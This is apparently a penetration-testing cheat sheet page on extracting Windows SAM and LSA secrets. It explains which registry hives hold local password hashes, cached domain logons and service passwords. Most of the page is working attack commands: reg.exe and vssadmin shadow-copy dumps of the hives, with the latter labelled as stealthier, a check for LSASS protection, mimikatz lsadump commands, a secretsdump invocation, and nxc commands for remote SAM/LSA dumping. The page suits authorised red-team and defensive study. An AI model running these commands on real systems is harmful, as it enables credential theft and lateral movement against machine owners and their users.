---
title: "SAM & LSA secrets"
---

# 🔓 SAM & LSA secrets

> _Local credential material stored in registry hives: local account hashes (SAM), domain cached logons (DCC2), service account passwords and DPAPI machine key (LSA secrets)._

| Hive            | Content                                                   |
| --------------- | --------------------------------------------------------- |
| `HKLM\SAM`      | Password hashes for local user accounts                   |
| `HKLM\SYSTEM`   | System boot key (decrypts SAM and SECURITY)               |
| `HKLM\SECURITY` | LSA secrets (DCC2 cache, cleartext passwords, DPAPI keys) |

## Dump methods

### reg.exe (live system)

```cmd
reg.exe save hklm\sam C:\Windows\Temp\sam                         # requires SYSTEM (or SeBackupPrivilege)
reg.exe save hklm\system C:\Windows\Temp\system
reg.exe save hklm\security C:\Windows\Temp\security
```

### vssadmin (shadow copy - more stealth)

```cmd
vssadmin create shadow /for=C:                                    # replace X below with the shadow copy number returned
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\Windows\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\Windows\Temp\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SECURITY C:\Windows\Temp\security
```

### Check PPL (needed for live mimikatz lsadump)

```powershell
Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}
```

> _PPL blocks mimikatz's live `lsadump::secrets` (which talks to LSASS); `reg save` / `vssadmin` work regardless._

## Extract credentials

### secretsdump (impacket)

::: code-group

```bash [secretsdump]
secretsdump -sam sam -system system -security security LOCAL
```

```bash [mimikatz]
mimikatz # privilege::debug
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
```

```bash [nxc]
# Remote dump (requires admin on the target)
nxc smb $TARGET -d $DOMAIN -u $USER -p $PASSWORD --sam
nxc smb $TARGET -d $DOMAIN -u $USER -p $PASSWORD --lsa

# Local account auth (non domain-joined)
nxc smb $TARGET --local-auth -u $USER -p $PASSWORD --sam
```

:::

> _For DPAPI blobs (Credential Manager, browsers, vaults), see the dedicated [DPAPI cheatsheet](./dpapi.md)._
